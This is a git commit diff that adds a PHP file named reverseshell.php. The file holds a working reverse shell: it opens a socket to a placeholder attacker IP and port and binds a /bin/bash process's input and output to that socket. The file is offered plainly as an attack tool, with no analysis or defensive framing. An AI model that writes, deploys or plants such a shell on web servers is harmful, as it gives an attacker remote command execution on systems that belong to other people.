d32cfbdcf3d713d9aeb3f7f3f430d55bb9f3be11
thekarunakarreddy <76210523+thekarunakarreddy@users.noreply.github.com>
2023-05-26 11:55:46 +0530

    Update reverseshell.php

--- reverseshell.php
+++ reverseshell.php
@@ -1,1 +1,24 @@
+<?php
+$ip = 'your_ip_address';
+$port = your_port_number;
+$shell = '/bin/bash';
+
+$sock = fsockopen($ip, $port);
+
+if ($sock) {
+    $descriptorspec = array(
+        0 => $sock,
+        1 => $sock,
+        2 => $sock
+    );
+
+    $process = proc_open($shell, $descriptorspec, $pipes);
+
+    if (is_resource($process)) {
+        while ($f = fgets($pipes[2])) {
+            fputs($sock, $f);
+        }
+    }
+}
+?>
 
